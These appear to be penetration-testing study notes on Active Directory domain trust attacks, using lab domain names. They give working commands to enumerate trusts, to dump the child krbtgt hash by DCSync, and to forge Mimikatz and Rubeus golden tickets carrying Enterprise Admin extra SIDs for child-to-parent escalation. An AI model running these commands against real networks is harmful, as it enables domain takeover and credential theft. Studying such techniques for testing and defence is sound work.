# Domain Trusts

> * A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.
> * A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication.

## **Enumerating Trust Relationships**

1. Enumerate trust relationships:\
   `Import-Module activedirectory` followed by `Get-ADTrust -Filter *`
2. Check existing trusts:\
   `Import-Module .\PowerView.ps1` followed by `Get-DomainTrust` or `Get-DomainTrustMapping`
3. Check users in other Domain:\
   `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName`
4. Query domain trust: `netdom query /domain:inlanefreight.local trust`
5. Query domain controllers: `netdom query /domain:inlanefreight.local dc`
6. Query workstations and servers: `netdom query /domain:inlanefreight.local workstation`
7. Bloodhound: `Map Domain Trusts` pre-built query.

## **ExtraSids Attack (Child to Parent Trust)**

> sidHistory is an attribute used in migration scenarios: when a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain. SID history is intended to work across domains, but can work in the same domain.\
> \
> An attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.\
> \
> If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

**ExtraSids - Creating a Golden Ticket with Mimikatz or Rubeus**

* Suppose you already compromised the child domain and have domain admin access or similar.
* In order to create a golden ticket, you need to find the following:
  * Child domain's KRBTGT account's NT Hash.\
    Mimikatz: `lsadump::dcsync /user:CHILDDOMAIN\krbtgt`
  * Child domain's SID.\
    Use `Get-DomainSID`
  * Child domain's enterprise admin group's SID.\
    Use `Get-DomainGroup -Domain DOMAIN.NAME -Identity "Enterprise Admins" | select distinguishedname,objectsid`
* To create a golden ticket:
  * Mimikatz: `kerberos::golden /user:fakeuser /domain:CHILD.DOMAIN.LOCAL /sid:child-domain-sid /krbtgt:krbtgt-nt-hash /sids:enterprise-admins-group-sid /ptt`
  * Rubeus: `.\Rubeus.exe golden /rc4:krbtgt-nt-hash /domain:CHILD.DOMAIN.LOCAL /sid:child-domain-sid /sids:enterprise-admins-group-sid /user:fakeuser /ptt`
* Use `klist` to check if the Kerberos Ticket is in memory for the previously specified user (which doesn't need to exist).
* You can now list all the contents of the Domain Controller's C drive, perform DCSync and so on

## **Cross-Forest Trust Abuse**

* In a Cross-Forest trust relationship, you can perform cross-forest kerberoasting by just specifying the target domain
* It is also possible to perform cross-forest sid history abuse if SID Filtering is not enabled
* Sometimes, you can find admin password re-use and misconfigured group memberships in a cross-forest trust
